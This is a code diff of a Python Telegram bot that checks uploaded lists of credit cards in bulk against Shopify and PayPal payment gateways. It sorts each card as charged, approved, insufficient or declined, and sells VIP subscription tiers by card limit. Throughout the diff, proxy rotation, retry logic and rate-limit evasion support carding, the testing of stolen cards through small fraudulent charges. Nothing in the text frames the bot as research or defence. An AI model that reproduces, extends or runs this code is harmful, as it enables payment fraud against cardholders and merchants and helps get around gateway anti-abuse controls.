-            status = r.get('status'); msg = str(r.get('message', '')).lower()
+            status = r.get('status')
+            msg = str(r.get('message', '')).lower()
+            
+            # في حال وجود مشكلة في البروكسي/الاتصال، يتم تدويره والمحاولة مجدداً
             if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
-                if p_dict and proxies:
-                    if p_dict in proxies: proxies.remove(p_dict)
+                if p_dict:
+                    if p_dict in proxies:
+                        proxies.remove(p_dict)
                     asyncio.create_task(remove_proxy_by_url(uid, p_dict['proxy_url']))
-                lr = r; continue
+                lr = r
+                continue
+
+            # تخطي أخطاء الـ Rate Limit مؤقتاً
             if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
-                await asyncio.sleep(random.uniform(1.0, 1.8)); lr = r; continue
+                await asyncio.sleep(random.uniform(1.0, 1.8))
+                lr = r
+                continue
+
+            # في حال حدوث خطأ بوابة (Site Error) نقوم بتسجيله والانتقال لبوابة أخرى فوراً
             if status == 'Site Error' or is_dead_site_error(msg):
-                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1; lr = r; continue
-            return r
+                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+                lr = r
+                continue
 
         elif gateway_name == "PayPal":
             r = await check_paypal_api(card, p, session)
-            status = r.get('status'); msg = str(r.get('message', '')).lower()
-            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'timeout']):
-                if p_dict and proxies:
-                    if p_dict in proxies: proxies.remove(p_dict)
+            status = r.get('status')
+            msg = str(r.get('message', '')).lower()
+
+            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
+                if p_dict:
+                    if p_dict in proxies:
+                        proxies.remove(p_dict)
                     asyncio.create_task(remove_proxy_by_url(uid, p_dict['proxy_url']))
-                lr = r; continue
-            if status == 'Site Error': lr = r; continue
+                lr = r
+                continue
+
+            if status == 'Site Error' or is_dead_site_error(msg):
+                lr = r
+                continue
+        else:
+            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
+        
+        # إذا حصلنا على استجابة دفع حقيقية وحاسمة نخرج بها فوراً دون تكرار المحاولة
+        if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+            _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
             return r
-    return lr if lr else {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
-
-# ====================== HYBRID MASS PROCESS ENGINE ======================
-async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
-    uid = update.effective_user.id; tot = len(cards); chk = chg = app = ins = dec = err = 0; st = time.time()
-    sites = await get_shopify_sites()
-    proxies = await get_all_user_proxies(uid); proxies = list(proxies) if proxies else []
-    http_session = await get_user_http_session(uid); last_resp = sf("Waiting for response...")
-    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)
-
-    async def dashboard_updater():
-        while not is_stopped():
-            for _ in range(20):
-                if is_stopped(): break
-                await asyncio.sleep(0.1)
-            if is_stopped(): break
-            elapsed_now = int(time.time() - st)
-            cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
-            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            workers_line = f"├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n" if gate_name == "Shopify" else ""
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n{workers_line}├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
-            percent = int((chk / tot) * 100) if tot > 0 else 0
-            kb = [
-                [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
-                [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
-                [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
-                [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
-                [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
-            ]
-            try: await styled_edit(msg_obj, dt, buttons=kb)
-            except Exception: pass
-
-    ut = asyncio.create_task(dashboard_updater()); process_store[uid]["tasks"] = [ut]
-
-    if gate_name == "Shopify":
-        queue = asyncio.Queue()
-        for c in cards: queue.put_nowait(c)
-        sem = asyncio.Semaphore(WORKERS)
-        async def worker(wid):
-            await asyncio.sleep(wid * 0.05)
-            nonlocal chk, chg, app, ins, dec, err, last_resp
-            while not queue.empty() and not is_stopped():
-                try: card = queue.get_nowait()
-                except Exception: break
-                async with sem:
-                    try:
-                        c_st = time.time(); res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
-                        if is_stopped(): break 
-                        c_el = time.time() - c_st; status = res.get('status', 'Dead'); chk += 1
-                        raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                        last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
-                        if status == 'Charged':
-                            chg += 1; asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        elif status == 'Approved': app += 1
-                        elif status == 'Insufficient': ins += 1
-                        elif status == 'Site Error': err += 1
-                        else: dec += 1
-                    except asyncio.CancelledError: break
-                    except Exception: err += 1; chk += 1
-                    finally: queue.task_done()
-                if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
-        wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]; process_store[uid]["tasks"] += wt
-        await asyncio.gather(*wt, return_exceptions=True)
-
-    elif gate_name == "PayPal":
-        for card in cards:
-            if is_stopped(): break
-            try:
-                c_st = time.time(); res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=3)
-                if is_stopped(): break
-                c_el = time.time() - c_st; status = res.get('status', 'Dead'); chk += 1
-                raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
-                if status == 'Charged':
-                    chg += 1; asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                elif status == 'Approved': app += 1
-                elif status == 'Insufficient': ins += 1
-                elif status == 'Site Error': err += 1
-                else: dec += 1
-            except Exception: err += 1; chk += 1
-            if not is_stopped(): await asyncio.sleep(DELAY)
-
-    if not ut.done(): ut.cancel()
-    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60; avg_cpm = int((chk / el) * 60) if el > 0 else 0
-    workers_final = f"├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n" if gate_name == "Shopify" else ""
-    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n{workers_final}├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
-    fkb = [
-        [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
-        [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
-        [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
-        [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
-    ]
-    try: await styled_edit(msg_obj, ft, buttons=fkb)
-    except Exception: pass
-    process_store.pop(uid, None); await cleanup_user_http_session(uid)
+        lr = r
+        
+    if lr: return lr
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
-    bi = bin_info or {}; ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
+    bi = bin_info or {}
+    ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
     h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
-    cd = f"{sf(bi.get('country', '-'))} {get_flag_emoji(str(bi.get('country_code', '')))}"
-    return f"""{h}\n\n<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>\n<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>\n<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>\n<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>\n\n<b>{CE_GEAR} {sf('Bank Info')}:</b>\n ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>\n ├ <b>{sf('Country')}:</b> <code>{cd}</code>\n ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>\n ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>\n\n<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
+    
+    country_code = str(bi.get('country_code', '')).strip()
+    flag = bi.get('flag')
+    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
+        flag = get_flag_emoji(country_code)
+        
+    cd = f"{sf(bi.get('country', '-'))} {flag}"
+    
+    return f"""{h}
+
+<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>
+<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
+<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
+<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>
+
+<b>{CE_GEAR} {sf('Bank Info')}:</b>
+ ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>
+ ├ <b>{sf('Country')}:</b> <code>{cd}</code>
+ ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>
+ ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>
+
+<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
+
+async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, response_msg="Card Charged"):
+    return
 
 async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
     await asyncio.sleep(HIT_DELAY)
@@ -749,20 +917,26 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
-    uid = update.effective_user.id; pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Processing file data...')}</b>", use_gif=True)
+    uid = update.effective_user.id
+    pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Processing file data...')}</b>", use_gif=True)
     try:
         if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
             return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
         doc = update.message.document
-        if doc.file_size > 3 * 1024 * 1024: return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
+        if doc.file_size > 3 * 1024 * 1024: 
+            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
         if not await force_join_check(update, context): 
             try: await pm.delete()
             except Exception: pass
             return
         db_proxies = await get_all_user_proxies(uid)
-        if len(db_proxies) == 0: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
+        if len(db_proxies) == 0: 
+            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
         
-        f = await context.bot.get_file(doc.file_id); fp = f"temp_{uid}_{int(time.time())}.txt"; await f.download_to_drive(fp)
+        f = await context.bot.get_file(doc.file_id)
+        fp = f"temp_{uid}_{int(time.time())}.txt"
+        await f.download_to_drive(fp)
+        
         try:
             async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
         except Exception:
@@ -778,17 +952,18 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         kb = [
             [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
-            [InlineKeyboardButton('paypal 1$ (charge)', callback_data="gate:PayPal", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('PayPal Commerce ($1.00)', callback_data="gate:PayPal", style="primary", icon_custom_emoji_id="5447453226498552490")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
-# ====================== RESTORING ALL ORIGINAL SYSTEM COMMANDS ======================
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     if not update.message: return
-    uid = update.effective_user.id; USER_LAST_REQ[uid] = time.time(); _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
+    uid = update.effective_user.id
+    USER_LAST_REQ[uid] = time.time()
+    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
     raw_text = update.message.text or update.message.caption or ""
     
     if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
@@ -799,24 +974,36 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await auto_file_check_cmd(update, context)
         return
 
-    tokens = raw_text.split(); cmd = tokens[0][1:].lower().split('@')[0]; args = tokens[1:]
+    tokens = raw_text.split()
+    cmd = tokens[0][1:].lower().split('@')[0] 
+    args = tokens[1:]
 
     if cmd in ["start", "cmds", "commands"]:
         if _MAINTENANCE_MODE and uid not in ADMIN_ID: 
             return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
         if not await force_join_check(update, context): return
-        await ensure_user(uid); plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
+        await ensure_user(uid)
+        plan = await get_user_plan(uid)
+        limit = get_cc_limit(plan, uid)
         await send_welcome_menu(update, uid, plan, limit)
 
     elif cmd == "info":
         if not await force_join_check(update, context): return
-        await ensure_user(uid); plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
-        t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>\n\n├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
+        await ensure_user(uid)
+        plan = await get_user_plan(uid)
+        limit = get_cc_limit(plan, uid)
+        t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>
+
+├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>
+├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>
+├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>
+╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
         await styled_reply(update, t, use_gif=True)
 
     elif cmd == "plan":
         if not await force_join_check(update, context): return
-        cp = await get_user_plan(uid); t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
+        cp = await get_user_plan(uid)
+        t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
         for _, pi in PLANS.items():
             t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
         t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
@@ -845,7 +1032,9 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines = []
         if update.message.reply_to_message:
             if update.message.reply_to_message.document:
-                f = await context.bot.get_file(update.message.reply_to_message.document.file_id); fp = f"px_{uid}.txt"; await f.download_to_drive(fp)
+                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+                fp = f"px_{uid}.txt"
+                await f.download_to_drive(fp)
                 async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                 os.remove(fp)
             else:
@@ -855,14 +1044,17 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(tokens) > 1: lines = args
             else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
         
-        db_p = await get_all_user_proxies(uid); eu = {p['proxy_url'] for p in db_p} if db_p else set()
+        if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
+        db_p = await get_all_user_proxies(uid)
+        eu = {p['proxy_url'] for p in db_p} if db_p else set()
         if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
         parsed = []
         for l in lines:
             px = parse_proxy_format(l)
             if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
         if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added, invalid, or ignored (SOCKS).')}</b>", use_gif=True)
-        parsed = parsed[:100-len(eu)]; tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
+        parsed = parsed[:100-len(eu)]
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
         c = 0
         for p2 in parsed: await add_proxy_db(uid, p2); c += 1
         await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")
@@ -880,46 +1072,76 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await force_join_check(update, context): return
         proxies = await get_all_user_proxies(uid)
         if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found to check.')}</b>", use_gif=True)
-        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Starting real gateway proxy check... Please wait.')}</b>", use_gif=True); dead_indices = []
+            
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Starting real gateway proxy check... Please wait.')}</b>", use_gif=True)
+        dead_indices = []
+
         async def _check_proxy_via_gateway(index, p_dict):
             proxy_url = p_dict['proxy_url']
             try:
                 timeout = aiohttp.ClientTimeout(total=6, connect=3)
                 async with aiohttp.ClientSession(timeout=timeout) as test_session:
                     async with test_session.get("https://api.ipify.org", proxy=proxy_url) as r:
-                        if r.status == 200: return
-            except Exception: pass
+                        if r.status == 200:
+                            return
+            except Exception:
+                pass
             dead_indices.append(index)
-        tasks = [_check_proxy_via_gateway(idx, p) for idx, p in enumerate(proxies)]; await asyncio.gather(*tasks)
+
+        tasks = [_check_proxy_via_gateway(idx, p) for idx, p in enumerate(proxies)]
+        await asyncio.gather(*tasks)
+                
         deleted_count = 0
-        for idx in sorted(dead_indices, reverse=True): await remove_proxy_by_index(uid, idx); deleted_count += 1
-        if deleted_count > 0: await styled_edit(tm, f"<b>{CE_SMILE} {sf('Check Done')}</b>\n\n├ {sf('Removed Dead')}: <code>{deleted_count}</code> {sf('Proxies')}\n╰ {sf('Remaining Active')}: <code>{len(proxies) - deleted_count}</code> {sf('Proxies')}")
-        else: await styled_edit(tm, f"<b>{CE_SMILE} {sf('All proxies are working perfectly via Gateway!')}</b>")
+        for idx in sorted(dead_indices, reverse=True):
+            await remove_proxy_by_index(uid, idx)
+            deleted_count += 1
+            
+        if deleted_count > 0:
+            await styled_edit(tm, f"<b>{CE_SMILE} {sf('Check Done')}</b>\n\n├ {sf('Removed Dead')}: <code>{deleted_count}</code> {sf('Proxies')}\n╰ {sf('Remaining Active')}: <code>{len(proxies) - deleted_count}</code> {sf('Proxies')}")
+        else: 
+            await styled_edit(tm, f"<b>{CE_SMILE} {sf('All proxies are working perfectly via Gateway!')}</b>")
 
     elif cmd == "rmpxy":
         if not await force_join_check(update, context): return
         proxies = await get_all_user_proxies(uid)
         if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
         if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all, proxy number, or proxy text.')}</b>", use_gif=True)
+        
         arg = args[0].strip()
+        
         if arg.lower() == 'all':
-            c = await clear_all_proxies(uid); return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
+            c = await clear_all_proxies(uid)
+            return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
+        
         try:
             idx = int(arg) - 1
-            if 0 <= idx < len(proxies): await remove_proxy_by_index(uid, idx); return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed successfully by index.')}</b>", use_gif=True)
-        except ValueError: pass
+            if 0 <= idx < len(proxies): 
+                await remove_proxy_by_index(uid, idx)
+                return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed successfully by index.')}</b>", use_gif=True)
+        except ValueError:
+            pass
+            
         found = False
         for idx, p in enumerate(proxies):
-            if arg in p['proxy_url'] or p['ip'] in arg: await remove_proxy_by_index(uid, idx); found = True; break
-        if found: await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy matched and removed successfully.')}</b>", use_gif=True)
-        else: await styled_reply(update, f"<b>{CE_CLOWN} {sf('Proxy not found or invalid format.')}</b>", use_gif=True)
+            if arg in p['proxy_url'] or p['ip'] in arg:
+                await remove_proxy_by_index(uid, idx)
+                found = True
+                break
+                
+        if found:
+            await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy matched and removed successfully.')}</b>", use_gif=True)
+        else:
+            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Proxy not found or invalid format.')}</b>", use_gif=True)
 
     elif cmd == "gen":
         if uid not in ADMIN_ID: return
         if len(args) < 1: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/gen [plan] [qty]</code>", use_gif=True)
-        pk = args[0].lower(); amt = int(args[1]) if len(args) > 1 else 1
+        pk = args[0].lower()
+        amt = int(args[1]) if len(args) > 1 else 1
         if pk not in PLANS: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
-        pi = PLANS[pk]; kdb = await load_keys(); gc = []
+        pi = PLANS[pk]
+        kdb = await load_keys()
+        gc = []
         for _ in range(amt):
             c = f"VIP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
             kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -931,17 +1153,33 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "redeem":
         if not await force_join_check(update, context): return
-        c = unsf(args[0].strip()) if args else ""
+        raw_c = args[0].strip() if args else ""
+        c = unsf(raw_c)
         if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/redeem [Key]</code>", use_gif=True)
         kdb = await load_keys()
         if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
         ki = kdb[c]
         if ki["used"]: return await styled_reply(update, f"<b>{CE_BOOM} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
-        t, d = ki["tier"], ki["days"]; await set_user_plan(uid, t, d)
-        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S'); kdb[c]["redeemed_at"] = rt; await save_keys(kdb)
-        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d'); limit = get_cc_limit(t, uid); safe_name = escape_html(_USER_NAMES.get(uid, f"User {uid}"))
-        msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>\n\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>\n╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
+        t, d = ki["tier"], ki["days"]
+        await set_user_plan(uid, t, d)
+        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        kdb[c]["redeemed_at"] = rt
+        await save_keys(kdb)
+        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
+        limit = get_cc_limit(t, uid)
+        
+        user_name = _USER_NAMES.get(uid, f"User {uid}")
+        safe_name = escape_html(user_name)
+        
+        msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>
+
+├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
+├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>
+├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
+├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>
+╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
         await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
+        
         try:
             an = f"<b>{CE_PARTY} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(rt)}</code>"
             if ADMIN_ID:
@@ -950,10 +1188,15 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "validate":
         if uid not in ADMIN_ID: return
-        c = unsf(args[0].strip()) if args else ""; kdb = await load_keys()
+        raw_c = args[0].strip() if args else ""
+        c = unsf(raw_c)
+        kdb = await load_keys()
         if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/validate [Key]</code>", use_gif=True)
         if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=True)
-        ki = kdb[c]; u = ki.get("used", False); ub = ki.get("used_by"); st = "Used" if u else "Active"
+        ki = kdb[c]
+        u = ki.get("used", False)
+        ub = ki.get("used_by")
+        st = "Used" if u else "Active"
